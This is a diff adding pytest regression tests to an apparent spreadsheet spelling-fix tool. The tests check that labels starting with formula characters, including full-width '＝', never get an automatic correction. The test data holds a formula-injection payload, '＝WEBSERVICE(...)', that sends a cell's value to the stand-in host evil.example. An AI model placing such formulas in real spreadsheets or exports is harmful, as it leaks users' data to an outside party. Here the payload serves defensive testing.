@@ -102,3 +102,19 @@ def test_a_spelling_the_column_writes_once_is_said_as_1_time():
     cols, rows = flags("LazyLoad", ["no"] * 21 + ["No"], ["Yes", "Unsure"])
     said = [o["reason"] for o in scan(cols, rows, fair=False)[1] if "LazyLoad" in o["reason"]]
     assert any('LazyLoad is written "no" 21 times and "No" 1 time (' in r for r in said), said
+
+
+@pytest.mark.parametrize("lead", ["＝", "＋", "－", "＠", "=", " ＝"])
+def test_a_label_typed_as_a_formula_is_never_given_a_spelling_fix(lead):
+    # AH-160: only "=+-@" kept a label out of the spelling check, so 10 "＝WEBSERVICE(...)" and one lowercase got an exact
+    # capitals fix, and the pane's auto-fix wrote the full-width formula (Excel reads ＝ as =) with no Accept
+    usual, slip = f'{lead}WEBSERVICE("https://evil.example/?"&A2)', f'{lead}webservice("https://evil.example/?"&A2)'
+    rows = [[usual, i] for i in range(10)] + [[slip, 10]] + [["Other", 11 + i] for i in range(10)]
+    out = scan(["Label", "N"], rows, fair=False)[1]
+    assert not any(o.get("exact") or o.get("likely") or o.get("maybe") for o in out), [o for o in out if o.get("reason")]
+
+
+def test_an_ordinary_label_beside_it_is_still_given_its_capitals_fix():
+    rows = [["East", i] for i in range(10)] + [["east", 10]] + [["Other", 11 + i] for i in range(10)]
+    out = scan(["Label", "N"], rows, fair=False)[1]
+    assert out[10].get("exact") == {"Label": "East"}, out[10]
